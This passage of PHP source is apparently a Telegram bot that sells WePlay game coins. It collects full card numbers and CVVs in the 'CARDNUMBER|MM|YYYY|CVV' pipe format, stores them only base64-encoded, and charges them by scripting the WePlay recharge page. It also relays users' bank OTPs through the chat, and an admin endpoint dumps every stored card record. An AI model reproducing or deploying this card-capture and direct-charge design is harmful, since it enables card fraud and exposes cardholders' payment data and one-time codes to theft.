                tg('answerCallbackQuery', ['callback_query_id' => $cbId, 'text' => 'Card removed'], $token);
                tgSend($token, $chatId, "🗑️ <b>Card #" . ($cardIdx + 1) . " removed.</b>");
                wpbHandleMyCards($cfg, $chatId, $token);
            } else {
                wpbSetDefaultCard($chatId, $cardIdx);
                tg('answerCallbackQuery', ['callback_query_id' => $cbId, 'text' => 'Default card set'], $token);
                tgSend($token, $chatId, "⭐ <b>Card #" . ($cardIdx + 1) . " set as default.</b>");
                wpbHandleMyCards($cfg, $chatId, $token);
            }
            return;
        }

        if ($data === 'ac_mycards') {
            tg('answerCallbackQuery', ['callback_query_id' => $cbId, 'text' => ''], $token);
            wpbHandleMyCards($cfg, $chatId, $token);
            return;
        }
        if ($data === 'ac_addcard') {
            tg('answerCallbackQuery', ['callback_query_id' => $cbId, 'text' => ''], $token);
            wpbHandleSaveCardStart($cfg, $chatId, $token);
            return;
        }
        if ($data === 'ac_remove') {
            // Remove default card
            $u   = wpbGetUserCards($chatId);
            $idx = (int)($u['default_idx'] ?? 0);
            wpbDeleteCardByIndex($chatId, $idx);
            tg('answerCallbackQuery', ['callback_query_id' => $cbId, 'text' => 'Default card removed', 'show_alert' => true], $token);
            tgSend($token, $chatId, "🗑️ <b>Default card removed.</b>\n\n<b>Use /mycards to manage remaining cards or /save to add a new one.</b>");
            return;
        }
        $enable = ($data === 'ac_on');
        $ok     = wpbToggleAutoCharge($chatId, $enable);
        $msg    = $enable ? '✅ Auto-charge enabled' : '❌ Auto-charge disabled';
        tg('answerCallbackQuery', ['callback_query_id' => $cbId, 'text' => $msg, 'show_alert' => false], $token);
        if ($ok) {
            tgSend($token, $chatId, "⚡ <b>" . ($enable ? "Auto-charge enabled." : "Auto-charge disabled.") . "</b>\n\n<b>Use /autocharge to manage your saved cards.</b>");
        } else {
            tgSend($token, $chatId, "⚠️ <b>No saved card found. Use /save to add a card.</b>");
        }
        return;
    }

    // ── /pay flow: coin package selected → pay_pkg:<index> ──────────────────
    if (preg_match('/^pay_pkg:(\d+)$/', $data, $m)) {
        $pkgIndex = (int)$m[1];
        $packages = $cfg['coin_packages'] ?? [];
        if (!isset($packages[$pkgIndex])) {
            tg('answerCallbackQuery', ['callback_query_id' => $cbId, 'text' => 'Package not found'], $token);
            return;
        }
        $pkg     = $packages[$pkgIndex];
        $profile = wpbGetProfile($chatId);
        $weplayId = $profile['weplay_id'] ?? '';
        tg('answerCallbackQuery', ['callback_query_id' => $cbId, 'text' => '✅ Package selected!'], $token);

        $saved = wpbGetDefaultCard($chatId);
        $acOn  = $saved && !empty($saved['autocharge']);
        $l4    = ($saved && $saved['last4']) ? ' •••• ' . $saved['last4'] : '';
        $net   = ($saved && $saved['network']) ? ' (' . $saved['network'] . ')' : '';

        $msg = "🛒 <b>Package Selected</b>\n\n"
            . "🎮 <b>Coins:</b> " . (int)$pkg['coins'] . " Coins\n"
            . "💵 <b>Price:</b> ₹" . number_format((float)$pkg['price'], 2) . "\n"
            . ($weplayId ? "<b>WePlay ID:</b> <code>" . htmlspecialchars($weplayId, ENT_NOQUOTES, 'UTF-8') . "</code>\n" : '') . "\n";

        if ($acOn) {
            $msg .= "⚡ <b>Auto-charge card{$l4}{$net} se payment hogi.</b>\n\n"
                . "<b>/autocharge dabao to payment start hogi.</b>";
            $keyboard = ['inline_keyboard' => [
                [['text' => '⚡ Auto-Charge Now — ₹' . number_format((float)$pkg['price'], 2), 'callback_data' => 'pay_ac:' . $pkgIndex]],
                [['text' => '🔄 Change Card', 'callback_data' => 'ac_mycards']],
            ]];
        } else {
            $msg .= "<b>💳 Card save nahi hai auto-charge ke liye.</b>\n\n"
                . "<b>Use /save to add your card in format:</b>\n"
                . "<code>CARDNUMBER|MM|YYYY|CVV</code>\n"
                . "<b>Example:</b> <code>5430139926528329|06|2028|082</code>";
            $keyboard = ['inline_keyboard' => [
                [['text' => '💾 Save Card (/save)', 'callback_data' => 'ac_addcard']],
            ]];
        }
        tgSend($token, $chatId, $msg, $keyboard);
        return;
    }

    // ── /pay flow: auto-charge triggered from package selection ─────────────
    if (preg_match('/^pay_ac:(\d+)$/', $data, $m)) {
        $pkgIndex = (int)$m[1];
        $packages = $cfg['coin_packages'] ?? [];
        if (!isset($packages[$pkgIndex])) {
            tg('answerCallbackQuery', ['callback_query_id' => $cbId, 'text' => 'Package not found'], $token);
            return;
        }
        $pkg      = $packages[$pkgIndex];
        $profile  = wpbGetProfile($chatId);
        $weplayId = $profile['weplay_id'] ?? '';
        $saved    = wpbGetDefaultCard($chatId);

        if (!$saved || empty($saved['autocharge'])) {
            tg('answerCallbackQuery', ['callback_query_id' => $cbId, 'text' => 'Auto-charge not enabled', 'show_alert' => true], $token);
            return;
        }
        // Card details must be present (manual type)
        if (empty($saved['card_number_enc']) && empty($saved['token_id'])) {
            tg('answerCallbackQuery', ['callback_query_id' => $cbId, 'text' => 'Card details not found', 'show_alert' => true], $token);
            tgSend($token, $chatId, "⚠️ <b>Card details nahi mile.</b> /save se card dobara save karo.");
            return;
        }

        tg('answerCallbackQuery', ['callback_query_id' => $cbId, 'text' => '⚡ Charging...'], $token);

        $amount = (float)$pkg['price'];
        $txnId  = 'WP' . date('ymdHis') . mt_rand(100, 999);
        $l4     = $saved['last4']   ? ' •••• ' . $saved['last4']   : '';
        $net    = $saved['network'] ? ' (' . $saved['network'] . ')' : '';

        $pendingRec = [
            'txn_id'         => $txnId,
            'chat_id'        => $chatId,
            'user_name'      => ($profile['telegram_name'] ?? ('ID ' . $chatId)),
            'weplay_id'      => $weplayId,
            'coins'          => (int)$pkg['coins'],
            'amount'         => $amount,
            'payment_method' => 'direct_card',
            'status'         => 'processing',
            'created_at'     => date('c'),
        ];
        wpbPendingSave($txnId, $pendingRec);

        tgSend($token, $chatId,
            "⚡ <b>Card{$l4}{$net} se charge ho raha hai…</b>\n\n"
            . "🎮 <b>Coins:</b> " . (int)$pkg['coins'] . "\n"
            . "💵 <b>Amount:</b> ₹" . number_format($amount, 2) . "\n"
            . "<b>🧾 Txn:</b> <code>{$txnId}</code>\n\n"
            . "<b>Processing…</b>"
        );

        // Build card array for direct charge
        $cardArr = [
            'number' => $saved['card_number_enc'] ? base64_decode($saved['card_number_enc']) : '',
            'month'  => $saved['expiry_month'] ?? '',
            'year'   => $saved['expiry_year']  ?? '',
            'cvv'    => $saved['cvv_enc'] ? base64_decode($saved['cvv_enc']) : '',
            'name'   => $saved['holder_name']   ?? 'Card Holder',
        ];

        $rechargeUrl = $cfg['weplay_recharge'] ?? 'https://weplayapp.com/recharge/?region=C';
        $result = wpbDirectChargeCard($rechargeUrl, $cardArr, $amount);

        if (!empty($result['ok'])) {
            $payId = $result['payment_id'];
            wpbPendingUpdate($txnId, ['status' => 'approved', 'approved_at' => date('c'), 'rzp_payment_id' => $payId, 'auto_charged' => true]);
            wpbLedgerDeposit($chatId, $amount, $txnId, $weplayId);
            wpbLog("direct_card approved txn={$txnId} pid={$payId}", 'success');
            tgSend($token, $chatId,
                "✅ <b>Payment Successful!</b>\n\n"
                . "🎮 <b>Coins:</b> " . (int)$pkg['coins'] . "\n"
                . "💵 <b>Amount:</b> ₹" . number_format($amount, 2) . "\n"
                . "<b>🧾 Txn:</b> <code>{$txnId}</code>\n"
                . "<b>💳 Payment ID:</b> <code>{$payId}</code>\n\n"
                . "<b>WePlay account credit hoga jald hi.</b>"
            );
            wpbNotifyAdmin($cfg, $txnId);

        } elseif (($result['next_action'] ?? '') === '3ds') {
            // Bank is asking for OTP / 3DS
            $otpUrl = $result['redirect_url'] ?? '';
            $payId  = $result['payment_id']   ?? '';
            wpbPendingUpdate($txnId, ['status' => 'awaiting_otp', 'rzp_payment_id' => $payId, 'otp_url' => $otpUrl]);
            // Store OTP context in user state
            wpbSetState($chatId, 'await_card_otp', [
                'txn_id'  => $txnId,
                'otp_url' => $otpUrl,
                'pay_id'  => $payId,
                'amount'  => $amount,
                'coins'   => (int)$pkg['coins'],
                'weplay_id' => $weplayId,
                'cookie_file' => WPB_COOKIE_DIR . '/wpb_rzp_' . md5($rechargeUrl) . '*.txt',
            ]);
            wpbLog("direct_card 3DS/OTP required txn={$txnId}", 'info');
            tgSend($token, $chatId,
                "🔐 <b>Bank OTP Required!</b>\n\n"
                . "<b>🧾 Txn:</b> <code>{$txnId}</code>\n\n"
                . "<b>Apne bank ka OTP bhejo (SMS/email mein aaya hoga):</b>\n\n"
                . "<b>Send /cancel to cancel.</b>"
            );

        } else {
            $errMsg = $result['error'] ?? 'Payment failed';
            wpbPendingUpdate($txnId, ['status' => 'failed', 'error' => $errMsg, 'failed_at' => date('c')]);
            wpbLog("direct_card failed txn={$txnId} err={$errMsg}", 'error');
            tgSend($token, $chatId,
                "❌ <b>Payment fail hua.</b>\n\n"
                . "<b>Error:</b> " . htmlspecialchars($errMsg, ENT_NOQUOTES, 'UTF-8') . "\n\n"
                . "<b>Card check karo aur dobara try karo ya support se contact karo: " . htmlspecialchars($cfg['support_contact'], ENT_NOQUOTES, 'UTF-8') . "</b>"
            );
            wpbNotifyAdmin($cfg, $txnId);
        }
        return;
    }

    // ── Coin package selected: pkg:<index> ──────────────────────────────────
    if (preg_match('/^pkg:(\d+)$/', $data, $m)) {
        $pkgIndex = (int)$m[1];
        $packages = $cfg['coin_packages'] ?? [];
        if (!isset($packages[$pkgIndex])) {
            tg('answerCallbackQuery', ['callback_query_id' => $cbId, 'text' => 'Package not found'], $token);
            return;
        }
        $pkg = $packages[$pkgIndex];
        tg('answerCallbackQuery', ['callback_query_id' => $cbId, 'text' => '✅ Package selected!'], $token);

        $profile = wpbGetProfile($chatId);
        $weplayId = $profile['weplay_id'] ?? '';

        $msg = "🛒 <b>Package Selected</b>\n\n"
            . "🎮 <b>Coins:</b> <b>" . (int)$pkg['coins'] . " Coins</b>\n"
            . "💵 <b>Price:</b> <b>₹" . number_format((float)$pkg['price'], 2) . "</b>\n"
            . ($weplayId ? "\n<b>WePlay ID:</b> <code>" . htmlspecialchars($weplayId, ENT_NOQUOTES, 'UTF-8') . "</code>\n" : '')
            . "\n💳 <b>Select a payment method:</b>";

        $keyboard = wpbPaymentMethodsKeyboard($cfg, $pkgIndex);
        tgSend($token, $chatId, $msg, $keyboard);
        return;
    }

    // ── Payment method selected: pm:<pkg_index>:<method_id> ─────────────────
    if (preg_match('/^pm:(\d+):([a-z0-9_]+)$/', $data, $m)) {
        $pkgIndex = (int)$m[1];
        $methodId = $m[2];
        $packages = $cfg['coin_packages'] ?? [];
        $methods = $cfg['payment_methods'] ?? [];

        $pkg = $packages[$pkgIndex] ?? null;
        $method = null;
        foreach ($methods as $met) { if ($met['id'] === $methodId) { $method = $met; break; } }

        if (!$pkg || !$method) {
            tg('answerCallbackQuery', ['callback_query_id' => $cbId, 'text' => 'Invalid selection'], $token);
            return;
        }

        tg('answerCallbackQuery', ['callback_query_id' => $cbId, 'text' => '✅ Payment method selected!'], $token);

        $profile = wpbGetProfile($chatId);
        $weplayId = $profile['weplay_id'] ?? '';

        // ── Auto-charge: charge saved card directly ──────────────────────────
        if ($methodId === 'autocharge') {
            $saved = wpbGetDefaultCard($chatId);
            if (!$saved) {
                tgSend($token, $chatId,
                    "⚠️ <b>Koi saved card nahi hai.</b>\n\n"
                    . "<b>/save se card save karo pehle:</b>\n"
                    . "<code>CARDNUMBER|MM|YYYY|CVV</code>"
                );
                return;
            }
            if (empty($saved['autocharge'])) {
                tgSend($token, $chatId,
                    "⚠️ <b>Auto-charge disabled hai.</b>\n\n"
                    . "<b>/autocharge se enable karo.</b>"
                );
                return;
            }
            if (empty($saved['card_number_enc'])) {
                tgSend($token, $chatId,
                    "⚠️ <b>Card details nahi mile.</b>\n\n"
                    . "<b>/save se card dobara save karo:</b>\n"
                    . "<code>CARDNUMBER|MM|YYYY|CVV</code>"
                );
                return;
            }
            $txnId  = 'WP' . date('ymdHis') . mt_rand(100, 999);
            $amount = (float)$pkg['price'];
            $pendingRec = [
                'txn_id'         => $txnId,
                'chat_id'        => $chatId,
                'user_name'      => ($profile['telegram_name'] ?? ('ID ' . $chatId)),
                'weplay_id'      => $weplayId,
                'coins'          => (int)$pkg['coins'],
                'amount'         => $amount,
                'payment_method' => 'direct_card',
                'status'         => 'processing',
                'created_at'     => date('c'),
            ];
            wpbPendingSave($txnId, $pendingRec);

            $net = $saved['network'] ? ' (' . $saved['network'] . ')' : '';
            $l4  = $saved['last4']   ? ' •••• ' . $saved['last4']  : '';
            tgSend($token, $chatId,
                "⚡ <b>Card{$l4}{$net} se charge ho raha hai…</b>\n\n"
                . "🎮 <b>Package:</b> " . htmlspecialchars($pkg['label'], ENT_NOQUOTES, 'UTF-8') . "\n"
                . "<b>💵 Amount:</b> ₹" . number_format($amount, 2) . "\n"
                . "<b>🧾 Txn ID:</b> <code>{$txnId}</code>\n\n"
                . "<b>Processing…</b>"
            );

            $cardArr = [
                'number' => base64_decode($saved['card_number_enc']),
                'month'  => $saved['expiry_month'] ?? '',
                'year'   => $saved['expiry_year']  ?? '',
                'cvv'    => $saved['cvv_enc'] ? base64_decode($saved['cvv_enc']) : '',
                'name'   => $saved['holder_name'] ?? 'Card Holder',
            ];
            $rechargeUrl2 = $cfg['weplay_recharge'] ?? 'https://weplayapp.com/recharge/?region=C';
            $result = wpbDirectChargeCard($rechargeUrl2, $cardArr, $amount);

            if (!empty($result['ok'])) {
                $payId = $result['payment_id'];
                wpbPendingUpdate($txnId, ['rzp_payment_id' => $payId, 'status' => 'approved', 'approved_at' => date('c'), 'auto_charged' => true]);
                wpbLedgerDeposit($chatId, $amount, $txnId, $weplayId);
                wpbLog("pm direct_card approved txn={$txnId} payment_id={$payId}", 'success');
                tgSend($token, $chatId,
                    "✅ <b>Payment Successful!</b>\n\n"
                    . "🎮 <b>Coins:</b> " . (int)$pkg['coins'] . " Coins\n"
                    . "<b>💵 Amount:</b> ₹" . number_format($amount, 2) . "\n"
                    . "<b>🧾 Txn ID:</b> <code>{$txnId}</code>\n"
                    . "<b>💳 Payment ID:</b> <code>{$payId}</code>\n\n"
                    . "<b>WePlay account credit hoga jald hi.</b>"
                );
                wpbNotifyAdmin($cfg, $txnId);
            } elseif (($result['next_action'] ?? '') === '3ds') {
                $otpUrl = $result['redirect_url'] ?? '';
                $payId  = $result['payment_id']   ?? '';
                wpbPendingUpdate($txnId, ['status' => 'awaiting_otp', 'rzp_payment_id' => $payId, 'otp_url' => $otpUrl]);
                wpbSetState($chatId, 'await_card_otp', [
                    'txn_id'    => $txnId,
                    'otp_url'   => $otpUrl,
                    'pay_id'    => $payId,
                    'amount'    => $amount,
                    'coins'     => (int)$pkg['coins'],
                    'weplay_id' => $weplayId,
                ]);
                wpbLog("pm direct_card 3DS required txn={$txnId}", 'info');
                tgSend($token, $chatId,
                    "🔐 <b>Bank OTP Required!</b>\n\n"
                    . "<b>🧾 Txn:</b> <code>{$txnId}</code>\n\n"
                    . "<b>Apne bank ka OTP bhejo:</b>\n<b>/cancel to cancel.</b>"
                );
            } else {
                $errMsg = $result['error'] ?? 'Payment failed';
                wpbPendingUpdate($txnId, ['status' => 'failed', 'error' => $errMsg, 'failed_at' => date('c')]);
                wpbLog("pm direct_card failed txn={$txnId} err={$errMsg}", 'error');
                tgSend($token, $chatId,
                    "❌ <b>Payment fail hua.</b>\n\n"
                    . "<b>Error:</b> " . htmlspecialchars($errMsg, ENT_NOQUOTES, 'UTF-8') . "\n\n"
                    . "<b>Support:</b> " . htmlspecialchars($cfg['support_contact'], ENT_NOQUOTES, 'UTF-8')
                );
                wpbNotifyAdmin($cfg, $txnId);
            }
            return;
        }

        // Build the recharge URL with query params for pre-fill if possible
        $rechargeUrl = $cfg['weplay_recharge'] ?? 'https://weplayapp.com/recharge/?region=C';

        $msg = "✅ <b>Payment Method Selected</b>\n\n"
            . "🎮 <b>Package:</b> " . htmlspecialchars($pkg['label'], ENT_NOQUOTES, 'UTF-8') . "\n"
            . "💳 <b>Method:</b> " . htmlspecialchars($method['label'], ENT_NOQUOTES, 'UTF-8') . "\n"
            . ($weplayId ? "<b>WePlay ID:</b> <code>" . htmlspecialchars($weplayId, ENT_NOQUOTES, 'UTF-8') . "</code>\n" : '')
            . "\n<b>🔗 Open the link below to complete your payment:</b>\n\n"
            . htmlspecialchars($cfg['card_notice'] ?? '', ENT_NOQUOTES, 'UTF-8');

        $keyboard = ['inline_keyboard' => [
            [['text' => '💳 Complete Payment on WePlay', 'url' => $rechargeUrl]],
        ]];
        tgSend($token, $chatId, $msg, $keyboard);

        // Create a pending deposit record so admin can verify
        if (!empty($weplayId)) {
            $txnId = 'WP' . date('ymdHis') . mt_rand(100, 999);
            $pending = [
                'txn_id'         => $txnId,
                'chat_id'        => $chatId,
                'user_name'      => ($profile['telegram_name'] ?? ('ID ' . $chatId)),
                'weplay_id'      => $weplayId,
                'coins'          => (int)$pkg['coins'],
                'amount'         => (float)$pkg['price'],
                'payment_method' => $methodId,
                'status'         => 'pending_verification',
                'created_at'     => date('c'),
            ];
            wpbPendingSave($txnId, $pending);
            wpbNotifyAdmin($cfg, $txnId);
            wpbLog("Deposit via pkg {$pkgIndex} method={$methodId} txn={$txnId} chat={$chatId}", 'success');
        }
        return;
    }

    // ── Admin approve/reject ─────────────────────────────────────────────────
    $admin = (string)($cfg['admin_chat_id'] ?? '');
    $fromId = (string)($cb['from']['id'] ?? '');
    if ($admin && $admin[0] !== '-' && $fromId !== $admin) {
        tg('answerCallbackQuery', ['callback_query_id' => $cbId, 'text' => 'Admin only', 'show_alert' => true], $token);
        return;
    }
    if (!preg_match('/^(approve|reject):(.+)$/', $data, $m)) return;
    $action = $m[1];
    $txnId = $m[2];
    $p = wpbPendingGet($txnId);
    if (!$p) {
        tg('answerCallbackQuery', ['callback_query_id' => $cbId, 'text' => 'Transaction not found'], $token);
        return;
    }
    if (($p['status'] ?? '') === 'approved' || ($p['status'] ?? '') === 'rejected') {
        tg('answerCallbackQuery', ['callback_query_id' => $cbId, 'text' => 'Already handled'], $token);
        return;
    }
    if ($action === 'approve') {
        wpbPendingUpdate($txnId, ['status' => 'approved', 'approved_at' => date('c')]);
        wpbLedgerDeposit($p['chat_id'], $p['amount'], $txnId, $p['weplay_id'] ?? '');
        $coinsNote = !empty($p['coins']) ? "\n<b>Coins:</b> <b>" . (int)$p['coins'] . " Coins</b>" : '';
        tgSend($token, $p['chat_id'], "✅ <b>Deposit Approved!</b>\n\n<b>Amount:</b> <b>₹" . number_format((float)$p['amount'], 2) . "</b>{$coinsNote}\n<b>Txn:</b> <code>{$txnId}</code>");
        tg('answerCallbackQuery', ['callback_query_id' => $cbId, 'text' => 'Approved'], $token);
        wpbLog("Approved txn={$txnId}", 'success');
    } else {
        wpbPendingUpdate($txnId, ['status' => 'rejected', 'rejected_at' => date('c')]);
        tgSend($token, $p['chat_id'], "❌ <b>Deposit Rejected</b>\n\n<b>Txn:</b> <code>{$txnId}</code>\n<b>Support:</b> " . htmlspecialchars($cfg['support_contact'], ENT_NOQUOTES, 'UTF-8'));
        tg('answerCallbackQuery', ['callback_query_id' => $cbId, 'text' => 'Rejected'], $token);
        wpbLog("Rejected txn={$txnId}", 'error');
    }
}

session_start();
$cfg = wpbLoadConfig();
$isLoggedIn = !empty($_SESSION['wpb_ok']);

if (isset($_GET['webhook'])) {
    $update = json_decode(file_get_contents('php://input'), true);
    if (!is_array($update)) { http_response_code(200); exit; }
    if (!empty($update['callback_query'])) {
        wpbHandleCallback($cfg, $update['callback_query']);
    } else {
        $msg = $update['message'] ?? $update['channel_post'] ?? null;
        if ($msg) {
            wpbHandleText($cfg, $msg);
        }
    }
    http_response_code(200);
    exit;
}

// ── Razorpay Webhook (server-to-server payment confirmation) ─────────────────
if (isset($_GET['rzp_webhook'])) {
    $rawBody  = file_get_contents('php://input');
    $sig      = $_SERVER['HTTP_X_RAZORPAY_SIGNATURE'] ?? '';
    $secret   = trim($cfg['razorpay_webhook_secret'] ?? '');
    if (!rzpVerifyWebhook($rawBody, $sig, $secret)) {
        http_response_code(400);
        exit('Signature mismatch');
    }
    $event = json_decode($rawBody, true);
    $eventName = $event['event'] ?? '';

    if ($eventName === 'payment_link.paid' || $eventName === 'payment.captured') {
        $payload = $event['payload'] ?? [];

        // Extract payment and txn info
        $paymentObj = $payload['payment']['entity'] ?? ($payload['payment_link']['entity']['payments'][0]['payment'] ?? []);
        $notes      = $paymentObj['notes'] ?? ($payload['payment_link']['entity']['notes'] ?? []);
        $txnId      = $notes['txn_id'] ?? '';
        $chatId     = $notes['chat_id'] ?? '';
        $payId      = $paymentObj['id'] ?? '';

        if ($txnId && $chatId) {
            $p = wpbPendingGet($txnId);
            if ($p && !in_array($p['status'] ?? '', ['approved', 'rejected'])) {
                wpbPendingUpdate($txnId, [
                    'rzp_payment_id' => $payId,
                    'status'         => 'approved',
                    'approved_at'    => date('c'),
                    'rzp_event'      => $eventName,
                ]);
                wpbLedgerDeposit($chatId, $p['amount'], $txnId, $p['weplay_id'] ?? '');
                $token = trim($cfg['bot_token'] ?? '');
                $coinsNote = !empty($p['coins']) ? "\n<b>Coins:</b> <b>" . (int)$p['coins'] . " Coins</b>" : '';
                tgSend($token, $chatId,
                    "✅ <b>Payment Confirmed!</b>\n\n"
                    . "<b>💵 Amount:</b> ₹" . number_format((float)$p['amount'], 2) . "{$coinsNote}\n"
                    . "<b>🧾 Txn ID:</b> <code>{$txnId}</code>\n"
                    . "<b>💳 Payment ID:</b> <code>{$payId}</code>\n\n"
                    . "<b>Your WePlay account will be credited shortly.</b>"
                );
                wpbNotifyAdmin($cfg, $txnId);
                wpbLog("Razorpay webhook approved txn={$txnId} event={$eventName}", 'success');

                // If user has no saved card yet, extract token and save it
                if (!wpbGetSavedCard($chatId)) {
                    $custId  = $paymentObj['customer_id'] ?? '';
                    $tokId   = $paymentObj['token_id'] ?? '';
                    $cardObj = $paymentObj['card'] ?? [];
                    $last4   = $cardObj['last4'] ?? '';
                    $network = $cardObj['network'] ?? '';
                    if ($custId && $tokId) {
                        wpbSaveSavedCard($chatId, $custId, $tokId, $last4, $network);
                        tgSend($token, $chatId,
                            "💾 <b>Card saved for future auto-charges!</b>\n\n"
                            . "<b>Use /autocharge to manage your saved card and enable/disable auto-charge.</b>"
                        );
                        wpbLog("Saved card for chat={$chatId} token={$tokId}", 'info');
                    }
                }
            }
        }
    }
    http_response_code(200);
    exit('ok');
}

// ── Razorpay redirect callback (user lands here after completing payment link) ─
if (isset($_GET['rzp_callback'])) {
    $txnId  = preg_replace('/[^A-Za-z0-9]/', '', $_GET['razorpay_payment_id'] ?? ($_GET['txn_id'] ?? ''));
    $payId  = preg_replace('/[^A-Za-z0-9]/', '', $_GET['razorpay_payment_id'] ?? '');
    $linkId = preg_replace('/[^A-Za-z0-9]/', '', $_GET['razorpay_payment_link_id'] ?? '');
    // Find the pending record by payment link reference
    $allPending = wpbJsonLoad(WPB_PENDING_FILE);
    $foundTxn   = null;
    foreach ($allPending as $tid => $pr) {
        if (($pr['rzp_payment_link'] ?? '') && $payId && in_array($pr['status'] ?? '', ['pending_verification', 'autocharge_failed'])) {
            // Match by notes/reference — already handled via webhook; just show a page
            $foundTxn = $pr;
            break;
        }
    }
    header('Content-Type: text/html; charset=utf-8');
    echo '<!DOCTYPE html><html><head><meta charset="utf-8"><title>Payment Complete</title>'
        . '<style>body{font-family:sans-serif;text-align:center;padding:40px;background:#0d1017;color:#eef3ff}'
        . 'h1{color:#37ff8b}</style></head><body>'
        . '<h1>✅ Payment Received!</h1>'
        . '<p>Thank you! Your deposit is being processed.</p>'
        . '<p>Return to the bot for confirmation.</p>'
        . '</body></html>';
    exit;
}

if (isset($_GET['api_action'])) {
    header('Content-Type: application/json');
    $act = preg_replace('/[^a-zA-Z0-9_]/', '', $_GET['api_action'] ?? '');
    if ($act === 'login') {
        if (($_POST['pass'] ?? '') === $cfg['admin_pass']) {
            $_SESSION['wpb_ok'] = true;
            echo json_encode(['ok' => true]); exit;
        }
        echo json_encode(['ok' => false, 'error' => 'Wrong password']); exit;
    }
    if (!$isLoggedIn) { echo json_encode(['ok' => false, 'error' => 'Not logged in']); exit; }
    $body = json_decode(file_get_contents('php://input'), true) ?? [];
    switch ($act) {
        case 'logout':
            session_unset(); session_destroy();
            echo json_encode(['ok' => true]); exit;
        case 'get_config':
            $safe = $cfg; unset($safe['admin_pass']);
            echo json_encode(['ok' => true, 'data' => $safe]); exit;
        case 'save_config':
            foreach (['bot_token','admin_chat_id','weplay_site','weplay_recharge','support_contact','welcome_msg','deposit_thanks','card_notice','razorpay_key_id','razorpay_key_secret','razorpay_webhook_secret'] as $k) {
                if (isset($body[$k])) $cfg[$k] = trim((string)$body[$k]);
            }
            if (isset($body['autocharge_enabled'])) $cfg['autocharge_enabled'] = (bool)$body['autocharge_enabled'];
            if (isset($body['min_deposit'])) $cfg['min_deposit'] = max(1, (int)$body['min_deposit']);
            if (isset($body['max_deposit'])) $cfg['max_deposit'] = max($cfg['min_deposit'], (int)$body['max_deposit']);
            if (!empty($body['new_pass']) && strlen(trim($body['new_pass'])) >= 4) $cfg['admin_pass'] = trim($body['new_pass']);
            if (isset($body['coin_packages']) && is_array($body['coin_packages'])) {
                $cfg['coin_packages'] = array_values(array_filter(array_map(function($p) {
                    if (!is_array($p)) return null;
                    $label = trim((string)($p['label'] ?? ''));
                    $coins = max(0, (int)($p['coins'] ?? 0));
                    $price = max(0, (float)($p['price'] ?? 0));
                    if ($label === '' || $coins === 0) return null;
                    return ['label' => $label, 'coins' => $coins, 'price' => $price];
                }, $body['coin_packages'])));
            }
            if (isset($body['payment_methods']) && is_array($body['payment_methods'])) {
                $cfg['payment_methods'] = array_values(array_filter(array_map(function($m) {
                    if (!is_array($m)) return null;
                    $label = trim((string)($m['label'] ?? ''));
                    $id = preg_replace('/[^a-z0-9_]/', '', strtolower((string)($m['id'] ?? '')));
                    if ($label === '' || $id === '') return null;
                    return ['label' => $label, 'id' => $id];
                }, $body['payment_methods'])));
            }
            wpbSaveConfig($cfg);
            wpbLog('Config saved', 'info');
            echo json_encode(['ok' => true]); exit;
        case 'set_webhook':
            if (empty($cfg['bot_token'])) { echo json_encode(['ok' => false, 'error' => 'Bot token missing']); exit; }
            $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https://' : 'http://';
            $url = $scheme . $_SERVER['HTTP_HOST'] . strtok($_SERVER['REQUEST_URI'], '?') . '?webhook=1';
            $r = tg('setWebhook', ['url' => $url, 'allowed_updates' => ['message', 'channel_post', 'callback_query']], $cfg['bot_token']);
            echo json_encode(['ok' => $r['ok'] ?? false, 'webhook_url' => $url, 'tg' => $r]); exit;
        case 'remove_webhook':
            $r = tg('deleteWebhook', [], $cfg['bot_token']);
            echo json_encode(['ok' => $r['ok'] ?? false, 'tg' => $r]); exit;
        case 'get_logs':
            echo json_encode(['ok' => true, 'data' => array_slice(wpbJsonLoad(WPB_LOG_FILE), 0, 100)]); exit;
        case 'get_pending':
            echo json_encode(['ok' => true, 'data' => wpbJsonLoad(WPB_PENDING_FILE)]); exit;
        case 'clear_logs':
            wpbJsonSave(WPB_LOG_FILE, []);
            echo json_encode(['ok' => true]); exit;
        case 'get_saved_cards':
            // Flatten to a list for easier rendering: [{chat_id, card_idx, ...card_fields}]
            $rawStore = wpbJsonLoad(WPB_CARDS_FILE);
            $flatList = [];
            foreach ($rawStore as $cid => $udata) {
                $defIdx = (int)($udata['default_idx'] ?? 0);
                foreach (($udata['cards'] ?? []) as $ci => $card) {
                    $flatList[] = array_merge($card, [
                        'chat_id'    => $cid,
                        'card_idx'   => $ci,
                        'is_default' => ($ci === $defIdx),
                    ]);
                }
            }
            echo json_encode(['ok' => true, 'data' => $flatList]); exit;
        case 'delete_saved_card':
            $chatIdToRemove = (string)($body['chat_id'] ?? '');
            $cardIdxToRemove = isset($body['card_idx']) ? (int)$body['card_idx'] : null;
            if (!$chatIdToRemove) { echo json_encode(['ok' => false, 'error' => 'chat_id required']); exit; }
            if ($cardIdxToRemove !== null) {
                wpbDeleteCardByIndex($chatIdToRemove, $cardIdxToRemove);
                wpbLog("Admin removed card idx={$cardIdxToRemove} for chat={$chatIdToRemove}", 'info');
            } else {
                wpbDeleteSavedCard($chatIdToRemove);
                wpbLog("Admin removed all cards for chat={$chatIdToRemove}", 'info');
            }
            echo json_encode(['ok' => true]); exit;
        case 'toggle_autocharge':
            $chatIdToToggle = (string)($body['chat_id'] ?? '');
            $enableAC       = (bool)($body['enabled'] ?? false);
            $cardIdxToggle  = isset($body['card_idx']) ? (int)$body['card_idx'] : null;
            if (!$chatIdToToggle) { echo json_encode(['ok' => false, 'error' => 'chat_id required']); exit; }
            $ok = $cardIdxToggle !== null
                ? wpbToggleAutoChargeByIdx($chatIdToToggle, $cardIdxToggle, $enableAC)
                : wpbToggleAutoCharge($chatIdToToggle, $enableAC);
            wpbLog("Admin toggled autocharge chat={$chatIdToToggle} card_idx={$cardIdxToggle} enabled=" . ($enableAC ? '1' : '0'), 'info');
            echo json_encode(['ok' => $ok]); exit;
        case 'set_rzp_webhook':
            if (empty($cfg['bot_token'])) { echo json_encode(['ok' => false, 'error' => 'Bot token missing']); exit; }
            $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https://' : 'http://';
            $rzpWhUrl = $scheme . $_SERVER['HTTP_HOST'] . strtok($_SERVER['REQUEST_URI'], '?') . '?rzp_webhook=1';
            echo json_encode(['ok' => true, 'webhook_url' => $rzpWhUrl,
                'note' => 'Register this URL in your Razorpay Dashboard > Webhooks. Select events: payment.captured and payment_link.paid']); exit;
        default:
            echo json_encode(['ok' => false, 'error' => 'Unknown action']); exit;
    }
}

